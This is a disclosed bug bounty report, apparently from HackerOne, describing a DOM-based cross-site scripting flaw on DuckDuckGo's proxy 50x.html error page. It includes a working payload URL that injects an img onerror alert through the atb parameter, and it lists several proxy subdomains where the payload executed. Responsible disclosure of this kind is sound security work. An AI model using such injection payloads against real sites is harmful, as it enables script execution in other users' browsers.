@@ -1,0 +1,29 @@
+ReportLink:https://hackerone.com/reports/426275
+WeaknessName:Cross-site Scripting (XSS) - DOM
+Reporter:https://hackerone.com/smither
+ReportedTo:DuckDuckGo(duckduckgo)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:07.11.2018 15:44:46
+
+Summary:
+
+Hi,
+
+I read the report about DOM XSS on 50x.html page (https://hackerone.com/reports/405191).
+I decided to check some other subdomains to be sure.
+This link still executes javascript:
+https://proxy.duckduckgo.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(%27test%27);%3E
+
+The following subdomains execute javascript as well:
+proxy1.duckduckgo.com
+proxy2.duckduckgo.com
+proxy3.duckduckgo.com
+proxy4.duckduckgo.com
+
+@cujanovic: I'm sorry for stealing.
+
+## Impact
+
+The attacker can execute javascript code.
